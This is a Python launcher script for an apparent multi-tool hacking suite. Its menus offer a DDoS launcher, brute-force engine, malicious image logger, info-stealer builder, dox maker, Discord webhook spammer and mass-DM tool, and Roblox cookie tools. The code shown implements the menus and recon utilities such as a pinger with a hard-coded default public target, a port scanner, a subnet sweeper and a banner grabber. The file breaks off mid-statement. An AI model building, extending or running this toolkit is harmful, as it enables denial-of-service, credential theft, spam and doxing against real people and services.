#!/usr/bin/env python3
try:
    from core.ui import ConsoleUI, get_ui
    from core.ui.console import Colors
except Exception:
    class Colors:

        RED = '\033[91m'
        AMBER = '\033[93m'
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        RESET = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        BLUE = '\033[94m'
        BRIGHT_CYAN = '\033[1;36m'
        BRIGHT_GREEN = '\033[1;32m'
        BRIGHT_YELLOW = '\033[1;33m'
        BRIGHT_RED = '\033[1;31m'
        BRIGHT_MAGENTA = '\033[1;35m'
        CLEAR_SCREEN = '\033[2J\033[3J\033[H'

    ConsoleUI = None

    def get_ui():
        return None

ui = get_ui() if ConsoleUI else None

CURRENT_VERSION = "2.0.0"

import sys
from pathlib import Path


sys.path.insert(0, str(Path(__file__).parent))


DDoSAttack = None
BruteForceAttack = None
ImageLogger = None
BeastSettings = None
IMPORTS_OK = False
get_lang = None
logo_main = None
menu_ru = None
menu_en = None
logo_ddos = None
logo_bruteforce = None

try:
    from core.etc.settings import Settings as BeastSettings
    from core.etc.functions import get_lang, logo_main, menu_ru, menu_en, \
        logo_ddos, logo_bruteforce
    try:
        from colorama import init, Fore, Style, Back
        init()
    except ImportError:
        pass

    IMPORTS_OK = True
except Exception as e:
    print(f"{Colors.RED}[!] Warning: Could not load Beast Bomber UI modules. Check 'core' folder structure.{e}{Colors.RESET}")


try:
    from core.ddos_attack.ddos import DDoSAttack
except Exception:
    pass

try:
    from core.brute_force.bruteforce import BruteForceAttack
except Exception:
    pass

try:
    from core.image_logger.imagelogger import ImageLogger
except Exception:
    pass


try:
    from core.ui_theme import (DIR_THEME_STYLES, load_theme, save_theme,
                               handle_customize, show_theme, render_directory_ui)
    _CURRENT_THEME = load_theme()
except Exception:
    _CURRENT_THEME = "1"
    DIR_THEME_STYLES = {}
    load_theme = save_theme = handle_customize = show_theme = render_directory_ui = None


ddos_attack = DDoSAttack() if DDoSAttack else None
bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
image_logger_instance = ImageLogger() if ImageLogger else None

import os
import sys
import time
import random
import base64
import json
import socket
import struct
import subprocess
import shutil
import ctypes
import threading
import _thread
try:
    import msvcrt
except ImportError:
    msvcrt = None
import hashlib
import platform
import re
import math
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.request
import urllib.error
import urllib.parse
import ssl
try:
    import psutil
except Exception:
    psutil = None
try:
    import requests as _requests
except Exception:
    _requests = None
from getpass import getpass


if sys.platform.startswith('win'):
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        os.system('')

if ConsoleUI is not None:
    from rich.table import Table
    from rich.box import ROUNDED, DOUBLE
    from rich.text import Text as RichText
else:
    Table = None
    ROUNDED = None
    DOUBLE = None
    RichText = None

class DualStreamWriter:


    def __init__(self, original_stdout, log_file_handle):
        self.terminal = original_stdout
        self.log_file = log_file_handle
        self.ansi_regex = re.compile(r'\033\[[0-9;]*[a-zA-Z]')
        self.write_lock = threading.Lock()
        self.excluded_ips = self._load_excluded_ips()

    def _load_excluded_ips(self):

        excluded = set()


        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            if local_ip and local_ip != '127.0.0.1':
                excluded.add(local_ip)
        except Exception:
            pass


        try:
            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'input', 'excluded_ips.txt')
            if os.path.exists(config_path):
                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        ip = line.strip()
                        if ip and not ip.startswith('#'):
                            excluded.add(ip)
        except Exception:
            pass
        
        return excluded

    def _scrub_ips(self, text):

        if not self.excluded_ips:
            return text
        scrubbed = text
        for ip in self.excluded_ips:
            if ip in scrubbed:
                scrubbed = scrubbed.replace(ip, '[REDACTED]')
        return scrubbed

    def write(self, message):
        with self.write_lock:
            self.terminal.write(message)
            purified_message = self.ansi_regex.sub('', message)
            scrubbed_message = self._scrub_ips(purified_message)
            self.log_file.write(scrubbed_message)
            self.log_file.flush()

    def flush(self):
        with self.write_lock:
            self.terminal.flush()
            self.log_file.flush()


def _get_tree_input(prompt):
    try:
        from core.etc.input_handler import get_input
        return get_input(prompt)
    except ImportError:
        try:
            if msvcrt is not None:
                sys.stdout.write(prompt)
                sys.stdout.flush()
                buf = ""
                while True:
                    ch = msvcrt.getwch()
                    if ch == '\x00' or ch == '\xe0':
                        msvcrt.getwch()
                        continue
                    if ch == '\x1b':
                        print()
                        return "back"
                    if ch == '\r':
                        print()
                        break
                    if ch == '\b':
                        if buf:
                            buf = buf[:-1]
                            sys.stdout.write('\b \b')
                            sys.stdout.flush()
                        continue
                    buf += ch
                    sys.stdout.write(ch)
                    sys.stdout.flush()
                return buf.strip()
            else:
                return input(prompt).strip()
        except Exception:
            return input(prompt).strip()


def _render_directory_menu(title, items, header_color="cyan", dir_id="01"):

    if render_directory_ui is not None:
        render_directory_ui(_CURRENT_THEME, dir_id, items)
        return

    style = DIR_THEME_STYLES.get(_CURRENT_THEME, DIR_THEME_STYLES.get("1", {}))
    if style.get("plain"):
        print(f"  [{title}]")
        print()
        if not items:
            return
        maxw = max(len(item[1]) for item in items)
        for idx, item in enumerate(items):
            raw_key = item[0]
            key = f"{int(raw_key):02d}" if str(raw_key).isdigit() else str(raw_key)
            name = item[1]
            desc = item[2] if len(item) > 2 else ""
            print(f"  |-- [{key}] {name.ljust(maxw)} - {desc}")
        return

    tcolor = style.get("color", header_color)
    tmarker = style.get("marker", "")
    print(f"{tcolor}  [{title}]{Colors.RESET}")
    print()
    if not items:
        return
    maxw = max(len(item[1]) for item in items)
    for idx, item in enumerate(items):
        raw_key = item[0]
        key = f"{int(raw_key):02d}" if str(raw_key).isdigit() else str(raw_key)
        name = item[1]
        desc = item[2] if len(item) > 2 else ""
        print(f"{tcolor}  |-- [{key}] {name.ljust(maxw)} - {desc}{Colors.RESET}")


class MainframeUI:


    @staticmethod
    def draw_banner():

        if ui is not None:
            ui.banner()
        else:
            skull_ascii = r"""
         ______
      .-"      "-.
     /            \
    |              |
    |,.  .-.  .-.  ,|
    | )(__/  \__)( |
    |/     /\     \|
    (_     ^^     _)
     \__|IIIIII|__/
      | \IIIIII/ |
      \          /
      `--------`"""
            print(f"{Colors.CYAN}{skull_ascii}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.GREEN}" + "=" * 80)
            print("   MAINFRAME COMPREHENSIVE SECURITY RECONNAISSANCE ENGINE // MULTI-CORE")
            print("   DEPLOYMENT SPECIFICATION RELEASE v5.90 // COMPLETE 40-IN-1 TOOL PLATFORM")
            print("=" * 80 + f"{Colors.RESET}\n")

    @staticmethod
    def display_main_menu():

        if ui is not None:
            ui.main_menu()
            return

        style = DIR_THEME_STYLES.get(_CURRENT_THEME, DIR_THEME_STYLES.get("1", {}))
        tcolor = style.get("color", Colors.GREEN)

        print(f"{tcolor}{Colors.BOLD}  [MAIN SYSTEM DIRECTORY CORE]{Colors.RESET}\n")

        items = [
            ("1", "Sub-Directory 01", "Network Infrastructure & Endpoint Recon Cores"),
            ("2", "Sub-Directory 02", "OSINT Profilers, Integrity Audits & Target Record Tools"),
            ("3", "Sub-Directory 03", "Local Data Traffic, Utilities & Crypto Engines"),
            ("4", "Sub-Directory 04", "Advanced Infrastructure Audits & Integrity"),
            ("5", "Sub-Directory 05", "Attack Vectors, Exploit Frameworks & Defensive Auditing"),
            ("6", "Sub-Directory 06", "Discord Token, Webhook & Server Tools"),
            ("7", "Sub-Directory 07", "Dox Tools & OSINT Suites"),
            ("8", "Sub-Directory 08", "Stealer Builder & Payload Generation"),
            ("9", "Sub-Directory 09", "Roblox Intelligence & Cookie Tools"),
        ]

        maxw = max(len(item[1]) for item in items)
        for idx, item in enumerate(items):
            raw_key = item[0]
            key = f"{int(raw_key):02d}" if str(raw_key).isdigit() else str(raw_key)
            name = item[1]
            desc = item[2]

            is_last = (idx == len(items) - 1)
            prefix = "  +--" if is_last else "  |--"

            print(f"{tcolor}{prefix} [{key}] {name.ljust(maxw)} - {desc}{Colors.RESET}")

        print()
        print(f"{Colors.RED}  [SYSTEM SHUTDOWN CONTROL]{Colors.RESET}")
        print(f"{Colors.RED}  |-- [08] Terminate Active Mainframe Operator Control Session{Colors.RESET}")
        print(f"\n{Colors.BOLD}{Colors.GREEN}" + "-" * 80 + f"{Colors.RESET}")

    @staticmethod
    def display_network_menu():

        _render_directory_menu(
            "DIRECTORY 01 // NETWORK & TRAFFIC AUDIT",
            [
                ("1", "Rainbow Echo Pinger", "ICMP latency & reachability monitor", "cyan"),
                ("2", "Reverse DNS Resolver", "IP-to-host PTR resolution", "cyan"),
                ("3", "Port Scanner", "Multi-threaded port & service profiler", "cyan"),
                ("4", "Ping Sweeper", "Local subnet parallel host discovery", "cyan"),
                ("5", "Banner Grabber", "Remote service banner extractor", "cyan"),
                ("6", "Subdomain Finder", "Passive subdomain discovery via crt.sh logs", "cyan"),
                ("7", "RDAP Lookup", "WHOIS registration & allocation mapper", "cyan"),
                ("8", "HTTP Header Auditor", "Security header compliance & hardening", "cyan"),
                ("9", "DoH Resolver", "DNS-over-HTTPS client resolver", "cyan"),
                ("10", "IP Lookup", "IP geolocation & metadata reconnaissance", "cyan"),
            ],
            "cyan",
            "01",
        )

    @staticmethod
    def display_osint_menu():

        _render_directory_menu(
            "DIRECTORY 02 // EXTERNAL OSINT & TARGET PROFILE MGMT",
            [
                ("1", "Sherlock", "Username tracer across social platforms", "blue"),
                ("2", "PhoneInfoga", "Telecom & phone-number intelligence scanner", "blue"),
                ("3", "Holehe", "Breach-email auditor across providers", "blue"),
                ("4", "Socialscan", "Identity & account existence profiler", "blue"),
                ("5", "Breach Checker", "Live data breach & password-leak checker", "blue"),
                ("6", "Tor Exit Validator", "Tor exit-node legitimacy checker", "blue"),
                ("7", "Homograph Analyzer", "IDN homograph & punycode spoof detector", "blue"),
                ("8", "Name Search", "Search public records by full name + location", "blue"),
                ("9", "Reverse Image Search", "Find where an image appears online", "blue"),
                ("10", "Domain WHOIS", "Domain registration and ownership lookup", "blue"),
                ("11", "Email Validator", "Validate email address and MX records", "blue"),
            ],
            "blue",
            "02",
        )

    @staticmethod
    def display_utilities_menu():

        _render_directory_menu(
            "DIRECTORY 03 // LOCAL DATA TRAFFIC, SECURITY AUDITS & UTILITIES",
            [
                ("1", "Traffic Monitor", "Inbound packet sniffer & capture engine", "green"),
                ("2", "Secret Scanner", "Source-code secret & key leak scanner", "green"),
                ("3", "Hash Matrix", "Cryptographic hash signatures & token analyzer", "green"),
                ("4", "System Profiler", "Local host OS telemetry profiler", "green"),
                ("5", "Base64 Matrix", "Encode/decode data-transformation matrix", "green"),
                ("6", "Python Obfuscator", "Advanced Python code obfuscator", "green"),
                ("7", "Python Deobfuscator", "Deobfuscate Python code", "green"),
            ],
            "green",
            "03",
        )

    @staticmethod
    def display_advanced_audits_menu():

        _render_directory_menu(
            "DIRECTORY 04 // ADVANCED INFRASTRUCTURE AUDITS & INTEGRITY",
            [
                ("1", "File Integrity Monitor", "FIMS directory snapshot tracker", "magenta"),
                ("2", "SSL/TLS Auditor", "Cert expiry & cipher-suite auditor", "magenta"),
                ("3", "Connection Profiler", "Active listening-port & connection profiler", "magenta"),
                ("4", "Password Auditor", "Entropy & complexity compliance matrix", "magenta"),
                ("5", "ARP Profiler", "ARP table cache & duplicate-MAC auditor", "magenta"),
                ("6", "CIDR Calculator", "IPv4 subnet range & mask calculator", "magenta"),
                ("7", "UPnP Discovery", "SSDP smart-device explorer", "magenta"),
                ("8", "DNS Spoof Auditor", "Hosts-file poisoning & cache audit", "magenta"),
                ("9", "MAC Vendor Lookup", "OUI manufacturer vendor directory", "magenta"),
            ],
            "magenta",
            "04",
        )

    @staticmethod
    def display_attack_menu():

        _render_directory_menu(
            "SUB-DIRECTORY 05 // ATTACK VECTORS, EXPLOIT FRAMEWORKS & DEFENSIVE AUDITING",
            [
                ("1", "Beast Mode (DDoS)", "Distributed denial-of-service launcher", "red"),
                ("2", "Image Logger", "Malicious-image payload logger", "red"),
                ("3", "Brute Force", "Credential brute-force engine", "red"),
                ("4", "Metasploit Console", "msfconsole exploit-framework interface", "red"),
                ("5", "Msfvenom Egress", "Payload generation & network-egress tester", "red"),
                ("6", "Hashcat Auditor", "GPU password-strength compliance auditor", "red"),
                ("7", "Impacket Remoting", "psexec.py / wmiexec.py admin suite", "red"),
                ("8", "Log Diagnostic", "Real-time security-log diagnostic module", "red"),
                ("9", "Nmap Scanner", "Advanced port & service profiler", "red"),
            ],
            "red",
            "05",
        )

    @staticmethod
    def display_discord_menu():

        _render_directory_menu(
            "SUB-DIRECTORY 06 // DISCORD TOKEN, WEBHOOK & SERVER TOOLS",
            [
                ("1", "Token Info", "Show token account details", "blurple"),
                ("2", "Token Checker", "Validate a list of tokens", "blurple"),
                ("3", "Webhook Spammer", "Spam messages to a webhook", "blurple"),
                ("4", "Webhook Deleter", "Delete a webhook", "blurple"),
                ("5", "Nitro Gen + Checker", "Generate and check nitro codes", "blurple"),
                ("6", "Server Info", "Get server info from invite", "blurple"),
                ("7", "Server Cloner", "Clone server channels/roles", "blurple"),
                ("8", "Mass DM", "Send DMs to multiple users", "blurple"),
            ],
            "blurple",
            "06",
        )

    @staticmethod
    def display_stealer_menu():

        _render_directory_menu(
            "SUB-DIRECTORY 08 // STEALER BUILDER & PAYLOAD GENERATION",
            [
                ("1", "Stealer Builder", "Build info-stealer payloads with selected modules", "red"),
            ],
            "red",
            "08",
        )

    @staticmethod
    def display_roblox_menu():

        _render_directory_menu(
            "SUB-DIRECTORY 09 // ROBLOX INTELLIGENCE & COOKIE TOOLS",
            [
                ("1", "Cookie Information", "Show cookie account details", "green"),
                ("2", "Id Information", "Get user info by ID", "green"),
                ("3", "Username Information", "Get user info by username", "green"),
                ("4", "Group Information", "Get group info by ID", "green"),
                ("5", "Game Information", "Get game info by universe/place ID", "green"),
            ],
            "green",
            "09",
        )

    @staticmethod
    def display_dox_menu():

        _render_directory_menu(
            "SUB-DIRECTORY 07 // DOX TOOL",
            [
                ("1", "Dox Maker", "Use OSINT dir first to gather information", "red"),
                ("2", "UK Address Lookup", "Postcode area search & information", "cyan"),
                ("3", "UK Name Search", "Companies House person/company search", "cyan"),
            ],
            "red",
            "07",
        )

def find_global_command(command_name):

    cmd_path = shutil.which(command_name)
    if cmd_path:
        return cmd_path
        
    try:
        home_dir = os.path.expanduser('~')
        pipx_bin_dir = os.path.join(home_dir, '.local', 'bin')
        fallback_path = shutil.which(command_name, path=pipx_bin_dir)
        if fallback_path:
            return fallback_path
    except Exception:
        pass

    if os.name == 'nt':
        try:
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            if local_appdata:
                pipx_local_path = os.path.join(local_appdata, 'pipx', 'shared', 'bin')
                fallback_path = shutil.which(command_name, path=pipx_local_path)
                if fallback_path:
                    return fallback_path
        except Exception:
            pass

    try:
        import site
        if hasattr(site, 'getuserbase'):
            user_base = site.getuserbase()
            if user_base:
                fallback_dir = os.path.join(user_base, 'Scripts' if os.name == 'nt' else 'bin')
                fallback_path = shutil.which(command_name, path=fallback_dir)
                if fallback_path:
                    return fallback_path
    except Exception:
        pass

    try:
        bindir = os.path.dirname(sys.executable)
        fallback_path = shutil.which(command_name, path=bindir)
        if fallback_path:
            return fallback_path
        fallback_path = shutil.which(command_name, path=os.path.join(bindir, 'Scripts'))
        if fallback_path:
            return fallback_path
    except Exception:
        pass

    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        local_tools_dirs = [
            os.path.join(script_dir, 'hashcat-*'),
            os.path.join(script_dir, 'core', 'hashcat-*'),
        ]
        import glob
        for pattern in local_tools_dirs:
            for tool_dir in glob.glob(pattern):
                if os.path.isdir(tool_dir):
                    fallback_path = shutil.which(command_name, path=tool_dir)
                    if fallback_path:
                        return fallback_path
    except Exception:
        pass

    if os.name == 'nt':
        common_paths = [
            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Metasploit', 'bin'),
            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Metasploit-Framework', 'bin'),
            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Metasploit', 'bin'),
            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Metasploit-Framework', 'bin'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Metasploit', 'bin'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Metasploit-Framework', 'bin'),
            r'C:\metasploit-framework\bin',
        ]
        for path in common_paths:
            if os.path.isdir(path):
                fallback_path = shutil.which(command_name, path=path)
                if fallback_path:
                    return fallback_path

    return command_name

def title_scrambler_daemon():

    is_windows = sys.platform.startswith('win')
    machine_name = platform.node() or "mainframe"
    cores_online = os.cpu_count() or 1
    matrix_chars = "0123456789ABCDEFLEAKTRACKEDSECX⚡☠️"
    base_prefix = f"{machine_name} | CORES ONLINE: {cores_online} | "

    while True:
        random_hash = "".join(random.choice(matrix_chars) for _ in range(12))
        scrambled_title = f"{base_prefix}[{random_hash}]"

        if is_windows:
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(scrambled_title)
            except Exception:
                pass
        else:
            try:
                sys.stderr.write(f"\x1b]2;{scrambled_title}\x07")
                sys.stderr.flush()
            except Exception:
                pass
        time.sleep(0.4)



def run_pinger_engine():

    if ui is not None:
        ui.clear()
        ui.panel(
            RichText.from_markup("[bold red]NETWORK STREAM ENGINE DEPLOYED[/bold red]\n[yellow]Continuous ICMP echo latency monitor[/yellow]"),
            title="WARNING", border_style="red")
    else:
        print(f"{Colors.CLEAR_SCREEN}{Colors.RED}[WARNING // NETWORK STREAM ENGINE DEPLOYED]{Colors.RESET}")
    
    target_host = (ui.prompt_input("Enter target IP address [Default: 185.220.101.5]:", "185.220.101.5")
                   if ui is not None
                   else input(f"{Colors.BOLD}Enter target IP address routing node [Default: 185.220.101.5]: {Colors.RESET}").strip())
    if not target_host:
        target_host = "185.220.101.5"
    
    if ui is not None:
        ui.info("Spawning native network shell utility. Tap Ctrl+C to interrupt...")
    else:
        print(f"\n{Colors.CYAN}Spawning native network shell utility. Tap Ctrl+C to trigger interrupt signal...{Colors.RESET}\n")
    time.sleep(1)

    is_windows = sys.platform.startswith('win')
    cmd_args = ['ping', '-n', '1', '-w', '1000', target_host] if is_windows else ['ping', '-c', '1', '-W', '1', target_host]

    colors_list = ["red", "yellow", "green", "cyan"]
    idx = 0
    
    try:
        while True:
            start_time = time.time()
            process = subprocess.run(cmd_args, capture_output=True, text=True)
            duration_ms = int((time.time() - start_time) * 1000)
            
            color_name = colors_list[idx % len(colors_list)]
            out = process.stdout.lower()
            
            if process.returncode == 0 and ("ttl=" in out or "time=" in out) and "unreachable" not in out and "timed out" not in out:
                latency_str = ""
                if "time=" in out:
                    try:
                        parts = out.split("time=")[1].split()[0]
                        parts = ''.join(c for c in parts if c.isdigit() or c == '.')
                        latency_ms = float(parts)
                        latency_str = f"{latency_ms}ms"
                    except Exception:
                        latency_str = f"~{duration_ms}ms"
                else:
                    latency_str = f"~{duration_ms}ms"

                if ui is not None:
                    from rich.text import Text as _Text
                    row = _Text()
                    row.append("  \u25cf ", style=color_name)
                    row.append(f"{target_host} \u2192 ", style="bold white")
                    row.append(f"{latency_str}", style=color_name)
                    row.append("  [OK]", style="green")
                    ui.console.print(row)
                else:
                    print(f"{Colors.RED}{target_host} -> {latency_str} // ECHO_SUCCESS_ACK{Colors.RESET}")
            else:
                if ui is not None:
                    ui.error(f"{target_host} \u2192 TIMEOUT / DROPPED FRAME")
                else:
                    print(f"{Colors.RED}{target_host} -> TIMEOUT or DROPPED FRAME{Colors.RESET}")
            
            idx += 1
            time.sleep(0.4)
            
    except KeyboardInterrupt:
        if ui is not None:
            ui.warning("Stream stop signal logged. Console cache recovered.")
        else:
            print(f"\n\n{Colors.AMBER}[STREAM STOP SIGNAL LOGGED // CONSOLE CACHE RECOVERED]{Colors.RESET}")
        time.sleep(1.5)

def run_reverse_dns():

    if ui is not None:
        ui.section("MODULE 02 // REVERSE DNS INFRASTRUCTURE RESOLVER", "cyan",
                   subtitle="Performs lookups against pointer distribution files to track host allocation layers.")
    else:
        print(f"\n{Colors.AMBER}[MODULE 02 // REVERSE DNS INFRASTRUCTURE RESOLVER]{Colors.RESET}")
        print("Performs lookups against pointer distribution files to track host allocation layers.")

    target_ip = (ui.prompt_input("Enter target IP address to query:")
                 if ui is not None
                 else input("\nEnter target IP address to query: ").strip())
    if not target_ip:
        return
        
    if ui is not None:
        ui.info("Initiating socket gethostbyaddr handshake sequence...")
    else:
        print(f"\n{Colors.GREEN}Initiating socket gethostbyaddr handshake sequence...{Colors.RESET}")
    time.sleep(0.5)
    
    try:
        hostname, alias_list, ip_list = socket.gethostbyaddr(target_ip)
        if ui is not None:
            ui.result_table("RESOLUTION SUCCESSFUL — PTR DISCOVERED",
                            ["FIELD", "VALUE"],
                            [
                                ("Hostname", hostname),
                                ("Aliases", ", ".join(alias_list) if alias_list else "N/A"),
                                ("Interfaces", ", ".join(ip_list)),
                            ], border_style="green")
        else:
            print(f"\n{Colors.GREEN}[+] RESOLUTION SUCCESSFUL // PTR DISCOVERED{Colors.RESET}")
            print("-" * 75)
            print(f"  -> Hostname   : {Colors.CYAN}{hostname}{Colors.RESET}")
            print(f"  -> Aliases    : {alias_list}")
            print(f"  -> Interfaces : {ip_list}")
    except socket.herror:
        if ui is not None:
            ui.error("Host Resolution Miss: No valid reverse name pointers exist for this location.")
        else:
            print(f"\n{Colors.RED}[!] Host Resolution Miss: No valid reverse name pointers exist for this location.{Colors.RESET}")
    except Exception as err:
        if ui is not None:
            ui.error(f"Network Mapping Exception Logged: {err}")
        else:
            print(f"\n{Colors.RED}[!] Network Mapping Exception Logged: {err}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return to menu")
    else:
        input(f"\nModule matrix complete. Press Enter to pull up directory layout...")

def run_port_scanner():

    if ui is not None:
        ui.section("MODULE 03 // MULTI-THREADED PORT SCANNER & VULNERABILITY PROFILER", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 03 // MULTI-THREADED PORT SCANNER & VULNERABILITY PROFILER]{Colors.RESET}")
    target = (ui.prompt_input("Enter target domain or IP node:") if ui is not None else input("Enter target domain identifier or IP node: ").strip())
    if not target:
        return
        
    if ui is not None:
        ui.info("Resolving lookup records against root nameservers...")
    else:
        print(f"\n{Colors.GREEN}Resolving lookup records against root nameservers...{Colors.RESET}")
    try:
        target_ip = socket.gethostbyname(target)
        if ui is not None:
            ui.info(f"Target Identity Bound: {target_ip}")
        else:
            print(f"Target Identity Bound: {Colors.CYAN}{target_ip}{Colors.RESET}\n")
    except Exception as e:
        if ui is not None:
            ui.error(f"Failed to resolve server destination mapping: {e}")
        else:
            print(f"{Colors.RED}[!] Failed to resolve server destination mapping: {e}{Colors.RESET}")
        input("\nPress Enter to return...")
        return

    port_hardening_db = {
        21: ("FTP", "Plaintext credentials exchange. Audit for anonymous logins or transition to SFTP/FTPS."),
        22: ("SSH", "Secure Shell interface. Verify key-based authentication is enforced and root login is deactivated."),
        23: ("Telnet", "Highly insecure plaintext stream. Immediate deprecation recommended; transition to SSH."),
        25: ("SMTP", "Mail relay protocol. Ensure server is not operating as an open relay to prevent exploitation."),
        53: ("DNS", "Domain Name System. Audit against zone transfer exposures (AXFR) and amplification risks."),
        80: ("HTTP", "Unencrypted web platform. Enforce absolute TLS encryption redirects over port 443."),
        110: ("POP3", "Post Office Protocol. Plaintext credential exchange. Transition immediately to POP3S."),
        135: ("RPC Endpoint", "Microsoft RPC Endpoint Mapper. Often probed for environment footprinting. Restrict exposure."),
        139: ("NetBIOS", "NetBIOS Session Service. Legacy networking transport protocol. Restrict access at gateway boundary."),
        443: ("HTTPS", "Secure Web Socket. Verify modern cryptographic cipher baseline suites (TLS 1.2 / TLS 1.3) are mandatory."),
        445: ("SMB", "Microsoft Directory Sharing. Ensure message signing is required to mitigate relay threats."),
        1433: ("MSSQL", "Microsoft SQL Database engine server interface. Isolate from public ingress routes."),
        3306: ("MySQL", "Open-source SQL engine infrastructure node access point. Restrict to internal localhost paths."),
        3389: ("RDP", "Remote Desktop Gateway. Enforce Network Level Authentication (NLA) and route inside a defensive VPN."),
        8080: ("HTTP-Alt", "Alternative web application runtime proxy port. Review background system dependencies for patches."),
        8443: ("HTTPS-Alt", "Alternative secure server administration access dashboard. Restrict via strict ACL configurations.")
    }

    if ui is not None:
        scan_table = Table(title="PORT SCAN RESULTS", border_style="cyan", header_style="bold cyan", box=ROUNDED)
        scan_table.add_column("PORT", style="bold", width=10)
        scan_table.add_column("SERVICE", style="cyan", width=18)
        scan_table.add_column("STATUS", width=12)
        scan_table.add_column("DEFENSIVE PROFILING", ratio=1)
    else:
        print(f"{Colors.BOLD}{'INTERFACE':<12}{'SERVICE':<16}{'STATUS':<12}{'DEFENSIVE PROFILING ARCHIVE'}{Colors.RESET}")
        print("-" * 110)

    print_lock = threading.Lock()

    def scan_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.2)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                service_meta = port_hardening_db.get(port, ("unknown", "No supplementary baseline audit records compiled."))
                with print_lock:
                    if ui is not None:
                        scan_table.add_row(str(port), service_meta[0], "[green]OPEN[/green]", service_meta[1])
                    else:
                        print(f"{Colors.GREEN}Port {port:<8}{service_meta[0]:<16}{'OPEN':<12}{Colors.RESET}{Colors.AMBER}{service_meta[1]}{Colors.RESET}")
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(scan_port, sorted(port_hardening_db.keys()))

    if ui is not None:
        ui.console.print()
        ui.console.print(scan_table)
        ui.console.print()
    else:
        print("-" * 110)
    if ui is not None:
        ui.pause("Press Enter to resume")
    else:
        input(f"\nScan operations sequence terminated. Press Enter to resume...")

def run_ping_sweeper():

    if ui is not None:
        ui.section("MODULE 04 // LOCAL SUBNET PARALLEL PING SWEEPER", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 04 // LOCAL SUBNET PARALLEL PING SWEEPER]{Colors.RESET}")
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        default_subnet = ".".join(local_ip.split('.')[:3])
    except Exception:
        default_subnet = "192.168.1"

    subnet = (ui.prompt_input(f"Enter target local subnet prefix [Default: {default_subnet}]:", default_subnet)
              if ui is not None
              else (input(f"Enter target local subnet prefix [Default: {default_subnet}]: ").strip() or default_subnet))
    if ui is not None:
        ui.info(f"Initializing thread pools for network scan {subnet}.1 to {subnet}.254...")
    else:
        print(f"\n{Colors.CYAN}Initializing thread pools for network matrix {subnet}.1 to {subnet}.254...{Colors.RESET}\n")
    
    is_windows = sys.platform.startswith('win')
    cmd_base = ['ping', '-n', '1', '-w', '400'] if is_windows else ['ping', '-c', '1', '-W', '1']

    if ui is not None:
        sweep_table = Table(title="SUBNET SWEEP RESULTS", border_style="cyan", header_style="bold cyan", box=ROUNDED)
        sweep_table.add_column("IP ADDRESS", style="bold", width=20)
        sweep_table.add_column("METRIC STATUS", style="green", width=25)
    else:
        print(f"{Colors.BOLD}{'IP ADDRESS':<22}{'METRIC STATUS'}{Colors.RESET}")
        print("-" * 45)

    print_lock = threading.Lock()

    def check_host(i):
        ip = f"{subnet}.{i}"
        try:
            if subprocess.run(cmd_base + [ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                with print_lock:
                    if ui is not None:
                        sweep_table.add_row(ip, "[green]RESPONSIVE DEVICE ONLINE[/green]")
                    else:
                        print(f"{Colors.GREEN}{ip:<22}[ RESPONSIVE DEVICE ONLINE ]{Colors.RESET}")
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=35) as executor:
        executor.map(check_host, range(1, 255))

    if ui is not None:
        ui.console.print()
        ui.console.print(sweep_table)
        ui.console.print()
    else:
        print("-" * 45)
    if ui is not None:
        ui.pause("Press Enter to exit subsystem")
    else:
        input(f"\nSweep operation complete. Press Enter to exit subsystem layer...")

def run_banner_grabber():

    if ui is not None:
        ui.section("MODULE 05 // NETWORK SERVICE BANNER GRABBER AUDITOR", "cyan")
    else:
        print(f"\n{Colors.AMBER}[MODULE 05 // NETWORK SERVICE BANNER GRABBER AUDITOR]{Colors.RESET}")
    target = (ui.prompt_input("Enter target server domain or address block:") if ui is not None else input("Enter target server domain or address block: ").strip())
    if not target:
        return
    port_input = (ui.prompt_input("Enter operational application port (e.g., 21, 22, 80):") if ui is not None else input("Enter operational application port (e.g., 21, 22, 80): ").strip())
    try:
        port = int(port_input)
    except ValueError:
        ui.error("Format Check Exception: Target port must be a numerical value.") if ui else print(f"{Colors.RED}[!] Format Check Exception: Target port must be a numerical value.{Colors.RESET}")
        time.sleep(1.2)
        return

    if ui is not None:
        ui.info(f"Opening socket connection pipeline to {target}:{port}...")
    else:
        print(f"\n{Colors.GREEN}Opening socket connection pipeline to {target}:{port}...{Colors.RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.5)
        s.connect((target, port))
        
        if port in [80, 8080]:
            s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            
        banner = s.recv(1024)
        s.close()
        
        if ui is not None:
            ui.panel(banner.decode('utf-8', errors='ignore').strip(),
